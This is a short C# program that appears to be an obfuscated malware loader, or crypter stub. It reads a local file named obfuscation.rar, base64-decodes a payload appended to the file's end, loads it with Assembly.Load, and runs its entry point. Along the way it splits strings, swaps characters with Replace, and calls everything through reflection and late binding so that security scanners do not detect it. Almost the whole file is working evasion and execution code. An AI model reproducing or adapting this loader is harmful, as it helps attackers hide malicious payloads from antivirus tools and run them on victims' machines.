using System;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
public class ZZZ
{
    public string XXX(byte[] ZZZ, int start, int end)
    {
       
        return (string)LateBinding.LateGet(Activator.CreateInstance(Type.GetType("S" + "y" + "s" + "t" + "e" + "m" + "." + "T" + "e" + "x" + "t" + "."
      + "A" + "S" + "C" + "I" + "I" + "E" + "n" + "c" + "o" + "d" + "i" + "n" + "g") ?? throw new InvalidOperationException()), null,
      "3XPLOIT$%&/()=?".Replace("3XPLOIT", "G").Replace("$", "e")
      .Replace("%", "t").Replace("&", "S").Replace("/", "t").Replace("(", "r").Replace(")", "i")
      .Replace("=", "n").Replace("?", "g"), new object[] { ZZZ, start, end }, null, null);
    }
}
public class ZZZXXX
{
    public static void Main()
    {
        var b = (byte[])Type.GetType("System.IO.File")?.GetMethod("ReadAllBytes", new[]
        {typeof(string)})?.Invoke(null, new object[] { @"C:\Users\C#D3R\Desktop\obfuscation.rar" });//ruta 
        Interaction.CallByName(Interaction.CallByName(Type.GetType("System.Reflection.Assembly")?.GetMethod("/oad".Replace("/","L"), new[] { typeof(byte[]) })
        ?.Invoke(null, new[] { Type.GetType("System.Convert")?.GetMethod("FromBase64String", new []{typeof(string)})?.Invoke(null, new object[]
    {(string) Type.GetType("ZZZ")?.GetMethod("XXX")?.Invoke(Type.GetType("ZZZ")?.GetConstructor(Type.EmptyTypes)?.Invoke(new object[] { }),
    new object[] { b, b.Length - 32768, 32768 })  }) }) ?? throw new InvalidOperationException(),
        "%ntryPoin#".Replace("%","E").Replace("#","T"), CallType.Get), "Invoke", CallType.Method, 10000000 - 10000000, null);
    }
}